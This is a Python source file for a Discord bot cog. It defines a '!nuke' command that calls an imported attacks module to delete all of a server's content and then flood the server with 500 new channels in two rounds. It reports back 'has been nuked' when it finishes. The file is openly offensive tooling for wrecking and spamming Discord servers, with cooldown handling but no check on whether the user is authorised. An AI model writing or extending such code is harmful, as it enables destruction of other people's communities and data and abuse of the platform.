"""!nuke - the full package: wipe + flood, everything in parallel."""

import asyncio

import discord
from discord.ext import commands

from core import attacks
from .common import check_cooldown, token


class Nuke(commands.Cog):
    """Deletes everything, then floods 500 fresh channels - twice."""

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context):
        """Full nuke (runs in parallel)."""
        remaining = check_cooldown(ctx.author.id)
        if remaining:
            await ctx.send(embed=discord.Embed(
                description=f"Cooldown - wait **{remaining:.0f}s** before the "
                            "next command.",
                color=0xFEE75C))
            return
        if ctx.guild is None:
            await ctx.send(embed=discord.Embed(
                description="Run this in a server, not in DMs.",
                color=0xED4245))
            return
        guild = ctx.guild

        # start the nuke in a background task so the ack lands first
        async def _do_nuke():
            try:
                await attacks.nuke(token(), guild.id,
                                   channel_count=500, rounds=2)
                await ctx.send(embed=discord.Embed(
                    title="Nuke Complete",
                    description=f"**{guild.name}** has been nuked.",
                    color=0x57F287))
            except Exception as exc:
                await ctx.send(embed=discord.Embed(
                    title="Nuke Failed",
                    description=f"`{str(exc)[:400]}`",
                    color=0xED4245))

        nuke_task = asyncio.create_task(_do_nuke())
        await nuke_task


async def setup(bot: commands.Bot):
    await bot.add_cog(Nuke())
